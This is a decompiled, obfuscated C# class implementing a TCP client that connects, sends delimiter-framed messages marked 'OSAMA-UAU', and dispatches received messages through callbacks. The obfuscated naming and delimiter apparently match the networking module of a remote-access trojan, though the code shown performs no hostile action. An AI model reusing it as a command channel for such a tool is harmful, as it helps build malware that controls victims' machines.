using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using ns5;

namespace ns1;

internal class Class0
{
	public delegate void Delegate6();

	public delegate void Delegate7(byte[] b);

	public delegate void Delegate8();

	private string string_0;

	private TcpClient tcpClient_0;

	private Delegate6 delegate6_0;

	private Delegate8 delegate8_0;

	private Delegate7 delegate7_0;

	private bool bool_0;

	public Class0()
	{
		string_0 = "OSAMA-UAU";
		bool_0 = false;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public void method_0(Delegate6 delegate6_1)
	{
		delegate6_0 = (Delegate6)Delegate.Combine(delegate6_0, delegate6_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public void method_1(Delegate6 delegate6_1)
	{
		delegate6_0 = (Delegate6)Delegate.Remove(delegate6_0, delegate6_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public void method_2(Delegate8 delegate8_1)
	{
		delegate8_0 = (Delegate8)Delegate.Combine(delegate8_0, delegate8_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public void method_3(Delegate8 delegate8_1)
	{
		delegate8_0 = (Delegate8)Delegate.Remove(delegate8_0, delegate8_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public void method_4(Delegate7 delegate7_1)
	{
		delegate7_0 = (Delegate7)Delegate.Combine(delegate7_0, delegate7_1);
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	public void method_5(Delegate7 delegate7_1)
	{
		delegate7_0 = (Delegate7)Delegate.Remove(delegate7_0, delegate7_1);
	}

	public bool method_6()
	{
		try
		{
			if (tcpClient_0.Client.Connected)
			{
				return true;
			}
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void method_7(string string_1, int int_0)
	{
		try
		{
			try
			{
				if (tcpClient_0 != null)
				{
					tcpClient_0.Close();
					tcpClient_0 = null;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			while (bool_0)
			{
				Thread.Sleep(1);
			}
			try
			{
				tcpClient_0 = new TcpClient();
				tcpClient_0.Connect(string_1, int_0);
				Thread thread = new Thread(method_11, 10);
				thread.Start();
				delegate6_0?.Invoke();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			delegate8_0?.Invoke();
			ProjectData.ClearProjectError();
		}
	}

	public void method_8()
	{
		try
		{
			tcpClient_0.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		tcpClient_0 = null;
		delegate8_0?.Invoke();
	}

	public void method_9(string string_1)
	{
		method_10(Class12.smethod_5(ref string_1));
	}

	public void method_10(byte[] byte_0)
	{
		try
		{
			MemoryStream memoryStream = new MemoryStream();
			memoryStream.Write(byte_0, 0, byte_0.Length);
			memoryStream.Write(Class12.smethod_5(ref string_0), 0, string_0.Length);
			tcpClient_0.Client.Send(memoryStream.ToArray(), 0, checked((int)memoryStream.Length), SocketFlags.None);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			method_8();
			ProjectData.ClearProjectError();
		}
	}

	private void method_11()
	{
		bool_0 = true;
		MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				Thread.Sleep(1);
				try
				{
					if (tcpClient_0 == null || !tcpClient_0.Client.Connected)
					{
						break;
					}
					num++;
					if (num > 100)
					{
						num = 0;
						try
						{
							if (tcpClient_0.Client.Poll(-1, SelectMode.SelectRead) & (tcpClient_0.Client.Available <= 0))
							{
								break;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							goto end_IL_0014;
						}
					}
					if (tcpClient_0.Available <= 0)
					{
						continue;
					}
					byte[] array = new byte[tcpClient_0.Available - 1 + 1];
					tcpClient_0.Client.Receive(array, 0, array.Length, SocketFlags.None);
					memoryStream.Write(array, 0, array.Length);
					while (true)
					{
						byte[] byte_ = memoryStream.ToArray();
						if (Class12.smethod_6(ref byte_).Contains(string_0))
						{
							Array array2 = Class12.smethod_0(memoryStream.ToArray(), string_0);
							delegate7_0?.Invoke((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null));
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							if (array2.Length == 2)
							{
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
								Thread.Sleep(1);
								continue;
							}
							break;
						}
						break;
					}
					continue;
					end_IL_0014:;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				break;
			}
			bool_0 = false;
			method_8();
		}
	}
}
